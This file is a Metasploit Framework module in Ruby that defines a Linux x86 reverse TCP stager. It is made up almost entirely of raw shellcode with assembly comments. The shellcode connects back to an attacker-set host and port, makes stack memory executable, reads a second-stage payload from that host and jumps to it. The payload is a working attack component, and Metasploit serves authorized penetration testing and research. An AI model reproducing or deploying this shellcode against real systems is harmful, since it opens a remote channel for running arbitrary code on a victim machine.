##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'msf/core/handler/reverse_tcp'


###
#
# ReverseTcp
# ----------
#
# Linux reverse TCP stager.
#
###
module Metasploit3

  include Msf::Payload::Stager
  include Msf::Payload::Linux

  handler module_name: 'Msf::Handler::ReverseTcp'

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Reverse TCP Stager',
      'Description'   => 'Connect back to the attacker',
      'Author'        => [
          'skape',  # original
          'egypt',  # NX support
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_X86,
      'Stager'        =>
        {
          'Offsets' =>
            {
              'LHOST' => [ 0x12, 'ADDR' ],
              'LPORT' => [ 0x19, 'n'    ],
            },
          'Payload' =>

            "\x31\xdb"             +#   xor ebx,ebx
            "\xf7\xe3"             +#   mul ebx
            "\x53"                 +#   push ebx
            "\x43"                 +#   inc ebx
            "\x53"                 +#   push ebx
            "\x6a\x02"             +#   push byte +0x2
            "\xb0\x66"             +#   mov al,0x66
            "\x89\xe1"             +#   mov ecx,esp
            "\xcd\x80"             +#   int 0x80
            "\x97"                 +#   xchg eax,edi
            "\x5b"                 +#   pop ebx
            "\x68\x7f\x00\x00\x01" +#   push dword 0x100007f
            "\x68\x02\x00\xbf\xbf" +#   push dword 0xbfbf0002
            "\x89\xe1"             +#   mov ecx,esp
            "\x6a\x66"             +#   push byte +0x66
            "\x58"                 +#   pop eax
            "\x50"                 +#   push eax
            "\x51"                 +#   push ecx
            "\x57"                 +#   push edi
            "\x89\xe1"             +#   mov ecx,esp
            "\x43"                 +#   inc ebx
            "\xcd\x80"             +#   int 0x80
            "\xb2\x07"             +#   mov dl,0x7
            "\xb9\x00\x10\x00\x00" +#   mov ecx,0x1000
            "\x89\xe3"             +#   mov ebx,esp
            "\xc1\xeb\x0c"         +#   shr ebx,0xc
            "\xc1\xe3\x0c"         +#   shl ebx,0xc
            "\xb0\x7d"             +#   mov al,0x7d
            "\xcd\x80"             +#   int 0x80
            "\x5b"                 +#   pop ebx
            "\x89\xe1"             +#   mov ecx,esp
            "\x99"                 +#   cdq
            "\xb6\x0c"             +#   mov dh,0xc
            "\xb0\x03"             +#   mov al,0x3
            "\xcd\x80"             +#   int 0x80
            "\xff\xe1"              #   jmp ecx

        }
      ))
  end

end
